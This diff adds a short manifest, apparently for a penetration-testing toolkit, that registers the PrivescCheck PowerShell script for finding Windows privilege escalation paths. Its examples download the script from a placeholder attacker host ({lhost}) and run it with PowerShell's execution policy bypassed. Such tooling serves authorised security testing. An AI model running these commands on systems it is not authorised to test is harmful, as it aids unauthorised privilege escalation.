@@ -1,0 +1,17 @@
+schema = 1
+kind = "upload"
+description = "Checks a Windows host for privilege escalation paths, from one PowerShell script"
+tags = ["windows", "privesc", "enum", "powershell"]
+upstream = "https://github.com/itm4n/PrivescCheck"
+licence = "BSD-3-Clause"
+arch = "x86_64"
+examples = [
+  "iwr http://{lhost}/PrivescCheck.ps1 -OutFile PrivescCheck.ps1",
+  "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\"",
+  "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report TXT,HTML\"",
+]
+
+[[upload]]
+path = "files/PrivescCheck.ps1"
+as = "PrivescCheck.ps1"
+note = "Run with: . .\\PrivescCheck.ps1; Invoke-PrivescCheck"
